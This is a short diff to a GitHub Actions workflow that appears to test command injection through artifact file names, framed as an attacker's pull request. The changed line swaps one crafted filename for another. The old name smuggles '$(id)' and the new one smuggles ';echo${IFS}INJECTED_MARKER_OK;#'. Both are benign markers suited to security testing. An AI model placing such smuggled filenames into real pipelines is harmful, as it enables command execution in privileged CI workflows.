@@ -14,7 +14,7 @@ jobs:
           mkdir -p /tmp/content
           printf 'hello from attacker pull request\n' > /tmp/content/summary.txt
           printf '%s\n' '${{ github.event.number }}' > /tmp/content/pr_number.txt
-          printf 'x\n' > '/tmp/content/x$(id>&2).txt'
+          printf 'x\n' > '/tmp/content/summary.txt;echo${IFS}INJECTED_MARKER_OK;#.txt'
           ls -la /tmp/content
       - name: Upload artifact
         uses: actions/upload-artifact@v4
